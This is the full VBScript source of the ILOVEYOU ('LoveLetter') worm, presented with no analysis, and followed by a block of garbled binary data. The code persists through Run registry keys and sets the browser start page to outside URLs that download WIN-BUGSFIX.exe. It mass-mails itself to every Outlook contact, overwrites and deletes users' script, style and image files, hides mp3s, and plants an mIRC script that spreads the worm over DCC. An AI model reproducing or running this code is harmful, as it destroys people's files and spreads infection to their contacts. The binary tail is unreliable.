rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           ƒÑ 3>.†Šƒµ!Ô©A0%Ò  U†` •0fUÂ 
ãPˆ‘ n@‘•PÊá&hä2îŒ›±ª¥ò¸|"ê%¦6f¥ÒBGêœ,%‚Î¢›¬& dj*´,VjuUt2\H1Š(‡˜I€q°²ÔAl®8ÏP‘â4ÁdHGQ‰ÊBØÕ\ì8s¦ŒÇÉÁH*jÍwqTP‘B”,¤B&ğ1Îƒ
1/í4r×Ü³ÌUëĞ>¦iì,“$“—UI¤„$/¢ æşÒPâCN¸…aFLó½ŠaeÄC±­`•à©“)€ÁøÂ¤$”' \a…%‡×†z‚Ç#ÒX´ØDò	_!Ó¯	0[@ JÕ'34NC=Ø»(•i›BiRÛA«'áİÌiØd£!‘ENÊ)†a!#ÂH:0:¡BDv<:7BÔ‹T„ñCWW)šÀb¥ğ{;ÚÀ…X™]¨Hœ1k(iI8$İ‰‰^[­vâlİÄ0ª†…&>ñ] ‘›™e3ÒÌ÷€l•À
f¢Ö+#‘ğŸãcq((Bp4à0ˆ«Hh@¸4
M@â.1ßù`Z(ÁTÉ3¡˜6†Ï¢¬Ú5Æ<HŠ8ãé Ğs°Œg['Ÿ¹TnRú%B¹é¥3+5:D†‡eVBMöX» ”¡©Æ;É}¢»Ë]0†:•‚X†ÄFzSäo&L
ô9`	°m`XÑZ“îd qäe0d
eÆ:^ªŠf@0ÃBH4.FµsR‚ç—3bƒ¬›ÅB×ıo§L¥aSY£Ÿwf|$xêJU$Ø*¢`!pH6p            @                      @                      @           P   <  ¹&ßáfñøàÜÈÄÀ¸¤¤œ”ŒŒˆ€€xph`Pxx˜D&‚ƒ@[ÃäTBd)‘‘ x'""K"@#Aˆ5&¾Vc#séê•¨ jŠXÔ1BHÛ¸4„B–[hb¥ì0BªºpŒWà¢ÄˆsÑT¬`âVÁ¡Z£€ÀÃµfNñCH‹x‚J`CÎ1Š¬ sÈ¤ªD’Bá(#ÒAÖÙWÆ•âö(¡ŒCA™8c†²"KK
“ÕˆLò¡¦U+µ¸š2‚@B1hy ˆ*uÖ8äó ´J0è`PÉJwÛp1C2UI„eÁ"äy"N‰< npd’Q¢F&U‰c<‡ã…Ê6äË!Ø‘€*(`„rNU-„A5d)¡±xJ¢œ>CÌrhYJ5x«Œg Bığ±`C&„PnP4ÒBæ¦CdÁ‚Aã,¨&WÄÂJ‚FÍËX²m	$íZU\¶M'rXQdX…£J)Ì"{˜ÍJÉº¨ÔœiE<‰F£CA#;SJ(JRZ3c òÙÀi‹–h H`Ô²Ša€gÙÁ´•ZcŒ(
†Å¸¢N&¦Sy€4Ô!ruÙ¤4ŠšRcpU¿ñY!$k7ˆŠÎLM)ÁÚHhĞ™ÊBiTcš…	q ¡85¤§ŒGQ*hÄURãÀ eÂÓÁ‘£ i.’
de9=K@¡âÂ3c"%’D±.Q$*è Ã×ÔAÚBÄ¢@Hî8Œ
…¶cv%TU€	~7X'Q²…¡I%,
a(šA‘@ÈÃ( ‚`‚‚Ds Š‹MP¶A5Ka@`Ú(
¦!3`¡IÓ\(¡î²×—D&‡„¥ƒ!T§‰9Z‘I#6ª`ÏPŒ(3Q„‚Pëk½Q"ŠÁŠ`®Ä¤ ˜ğŒ
~ õFJË¦ÆˆÄ8Œ¸N©ˆı­Õ~¢ ˆ %Xç3ÜÃ­ÿP°?"î2Ó ˆÁ€ˆü‹#ßˆihbJ#:ŒŠ[qTDPjAÃ‡•±B”!PÀDjØRB
;ª¡È)U‹E0gP&4FåyÅİ‚2jxšÀ$3N$2…ØT”7!©B))‘R’ë‹AŠÆä)€ˆŠ@ dĞÙ$§$«#B
B¨R!L€¡¹FbG|…8^ÖˆºÅ"C#+G Ô¡İÌ ±	dˆ
)U‚0Ğ4	ÃCJ@«´*D¨‚(1y"+$%•d.R¢ÌƒF ¤R‹'4BI%# ‰¢	]WCU4¨%å”@š4%b¤H!‰@5$‰Ö¬
„ÖÉH*‘R¥®$]‰&@:’¢H!%@AIDˆ(D©!!"	
Q’Jª!I‚B%„ B~P*I’T*I’$I*IBR•J’¤’$I’$J’$I’$I’$©$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$I’$í$I’$IR$I*I’$I%I’$	!‰’T¥RI’ª$•$I’(éNˆC)I¢„PHÒ€FF	’¨ ¶ "VI%H¨BœKRU“¨2%]¦( §DB„¸”ÌJ”TiH;C˜$h R’!…Î@”0@ª%!‰
ÈeWˆ	@Š!­„±¤ª£	$Mrf%$i†0EYÓÈ!I¤D2! @„äIF†ã‰"à¢	ÅD£4eB”0ˆ05%UJbT±®Y“˜Ã¶j"5šd±Ë)±CÙÄ†Q"™…É^‘ÌD±8%jÁhŠ[ÊA‚Ñ&„40‹fÕYLd¯†‚â1’
4B%`Hˆ¡Ç*Â° š½Ï"ô…Ö>l),ÊsFª¥‰÷\ye`eş±T^•Q‹¦ÉØ’eD 1¤ ª†¼–š”0íVldƒ1bff³.¢‘„UF™Q ¡@‰qÆAp	Aé Ã¨·=…p$Ey
1Åe0BhDU"Á• 2™<Jà)òU9d6k‚Ä •Éäe	êdˆ6zb	;‡a(z£„Ñ0‹’5©(E„ƒÆƒŒ™ú™Ká X¡ŠÂX¡©x$ò;’]˜†X†, !L9.Lnhn![h¦rÎg>ŠäUHT¤œ*»¯”0ENPÄQpM1H9EH²dnyØ
±…
 ¦à9œ©dƒ"sÈ@º‚¡‡mÇ‰~%ê˜˜dHÇ"	B¥ZpMŠ$İac©89£¢_Â`Ñ’2oµ%g@j+ T‰•vëÇŠ”Â™ÀqUZXğh;sJÁ,%ÌÅ 9”®CUt¡I„"’´”WqdÂI18ˆ…İ|«Š1‰ G|6U\ã^B„®"aht«C©¨]L]3ÊÓÒÎ¹PÚ,‡`nÔLíh1)Şé*‚ÁMXQÔt€ªÚaÑhQ‰€€e„Ë5,04FC`¨	¼‚iĞ ]Rb€‘•'
Â4‘ Ê€?i Âà `¨!¹T¤úò‚Œbw—7”)Šo"+—"}åãtÇ°¯«K3(¡Ê ±Pã0	H.C€¤oò¨„š¥K%Åó_´9vjz‘´œí0 )¼4!K¼¹ :Fkc£D¤F…Ì€§#^æ7¨AâF˜/B].B‘ªè$”S~“ĞZåŞÉ{J‹Ã"™T¥É˜k,(D&oJ
gÔÛ9GİÈÂç%nW‰‰Ãy×gØU AZ$àBÑTüt‡HDÀ­6‡Š§®¶Öt	E‹Š@â”Zà5±	éÀÈ‘Ùhç¸EJMŒ B	Ğœ	Í‰X$V *@³	G²ÂÈñA[´k2júñæ‘ÌÑÂ¡	9¤BÒ=4µ«ª 	‡ìú×øËp%	§ÂMIS(UUr´C9ÃjhyŠ^dá^b^Ò" š§=¤QñøØØÄÄÀ¬¤œ˜„Œ„||tl`XLtx„@ŠLFvI’0¡ 0’hH	0fŒZ @„ †0ÑQ»XÕĞ)?ğ†`Æ7g-D¥³Á[“›¼"²ª²†KÊĞ„—„ç|Yé¸Tî4ì*J€BâĞe
ì¸àĞ`†Ø‹çP²†Ä#H&„#ùF™d†à¢¡ƒ0•" QˆÑ˜h"…Q¨L‹À8À0Cc„F$Ì5¢¨†""dTı*äŒ—q^DH°á8¬»¢Ä
$ÙU”£ˆ”ö´Š¨CTM‚AVìÆuL9$`æƒA-¥X‡l :âf6š(Ğ#à–:Õ¡<
3›B‰’0*Û\2DÅ¢6äÒŠ9£ Q‘eêéH”rÔ”cwge£¦Í…Cc­ÌÍ¤ûEB"˜I0WÉ0B–9/£Dª#@TÌf"PĞN(¡P§ ˜]©”%NÅE"†,2	Îâ£fd0T£]ÑLS‹Û)ºÑã6ºÊÂÑ®ò!&rh(q†ãCWÉšA¢‚ñ‡€êÁ á pÒ†’sHÌêšUAˆ’5I¨ç¹t„j^"²¸œMı&>â@AÁºS(eÃ)^qÁ‚C!¸’O!ï1˜ZQ›aÅÀ9t´	VhÎd:¢dÆ±<÷y¤ €f4†—ÇhĞPÖ	"‘a„A„à|(ÉÆU	€Y¦HÀ¤ªW%<$&Â„Ä$%`“!Éë@¬^'’KUJ =«ëâxBé(˜*:Uˆ®i®0× D5Œ)Œ5%|›ş)ÙÌ¶:x}³‡@
`ù¢j3E1Ái«8>	÷qD*x ‘JÕ2UB=…µO‹uÆdƒ·†’‘R<<@l%/û¤/¶`M€I‰ã8T¬¯t‘HXš”"t,ˆÌÔÈ )œpİ†(›@“t!M¡Å9ˆªê.íÂ¦Úy2ùË³«±)‹à]¯`$†u´«™ô‰Q*‰
6„1ÅÉi’$ƒªÏ8‰ôD„ƒ4$É h@$ê(Ä¬tE²ªÑ	ˆSÍ&Ö¿âgÏÅB¡J¨NCô°\LÛá,LJrÎ9…¤zÒU¾jJ!™!$”” $¿ÙX@2C…†›™J’H•Ã(4$³2DLf`R©I‰×-IkPÓ–œ6-¦j™ëØ¸UbA 5Ã’9bšHdH´lIGãà¤&I4ƒ‚Ty¨†%¤±#°ª»Yšn¹õéf×QIFêîö„µ9!º‰M›&
ìàJN“@u§ÓéCBpœÄØIÌ@ ’$„$!IÀ 	„$@,@À!@  B‚ %@ D€’ FHH „„@!$@R€H’$I’$I’„$$$	I’$	$	I’$IH’$I’$I’$$I€$$ !¡’$I’$$	éÄIH’$IHIL€4İA$I¤"¤œ@HÇî†Ğ8  $…ÒĞ	REI,)„ D€DUM¨ Jª¤‹Ô”C-:}‘â¶A B€4ÈQ“&„Út$qUrˆ R ¤ÌrÀ€63ƒ@Dªæ3Ä –Œ&µ„	uHª”)$ê‚­yÂ .	U]!•U¨8ÈÇ/RÈÀa)!c‚u ’™›¥*H%™Œ äTaíGÌ ¢4 ‰‚%Q²`À´š)HJ°HFR&´E$$C(¡2“Àm†&©Äb D P1dÂ”.‘Ä p&y(	DÄQ&ˆEiô¨T_Ã'1HD
qd„I¢l’İp¢£™¡HC8X˜qÊ2qËÈÌLÒF¢'è}4·ƒÙIR)L”«’<ÉÍÊñÉ¨ı Râ€Ø‹…	c,‰´I#¡ à`9ƒÑÒtF„ˆÛÔdA"j ˆ¦0?Î¢×è AÌ°ëmRU2Ã	(ÒC¡'dA‹ ‡4Ë°ƒ±§ 4Gd)¤x®!M‰½@¤¤jRø .3ÇZ  0²ŠD&ùF˜Š´¡DˆĞíH	ÃRi©»OîZ§‚µ”Hœ;2©‡Ãa a
”'¨ÕAmtĞÄÀV°\R'Bfñ%ÅØ-ÔY‰“„QbBàøÑ€ rÄ‡WIàXÌrG˜qš##
X²¤0B„×S‚¤2& Âó`Náœ-a!
¬L…'Hˆ6( ²âlE+Úk‹©‚5™ÙU&üøxÒ1.×lÊV¯¨dpá1½à)W¢4¡ÚŠ Á‰/‚z4Q*Næ&%2B©¢q ×PŒr˜„§2ºIF R`Tjc ‘I!bW¨*2êX3ÏV–‡¨‚„*·ÆQ°xtçß‚°ìÑ=j…IU„+¨Áˆ£„QK‘H—Š"(Å.—c:+NcB#šœ€ æÁ†F(q‘0UƒfqÉ0œÔ^ØÊÉÎ*22Ş‰‘US?²2*Á$‘àÅê/ˆ$‚-2?R]¹Y(© Ö¸ğI;UË3ô¢8óÎ¢è”–ÄDƒ%£Ch iÊ´@(fÅà¸Fº%—ÎbP~‘GÎµ¨’"a”x$ª0ÌIázixßÇYòKGˆF°0’9F-	•ƒÔ Ä,ù€„Êˆƒ÷Ex)JU}¤ÙxtÃeµ®o%tŠ&N×ÃL	†€©„04³o™ı_¶ŠLqà(
zi!Ë~ÌÎëÍi„4i(9á6†ÆM#qÈ‰K´!Bƒ5Å‹ºì(Æk)ĞKˆhÀ,`Ø±g<YÆ‰{ˆpÔ               @                      @                      @           4     
 ïyrìıôàØÌÌ¼°¨œœŒ„„€€tph`PHtxœŞEÆ&e ‚39&Ñ
ĞB†B”(ˆ8ÆX‹HD@=¨HÅ(€L¹%â:¨¢E¬WBfJJ–gšLŸèôCù
ƒ„Û¤v˜5ÄA‘4 *ƒ\”ñ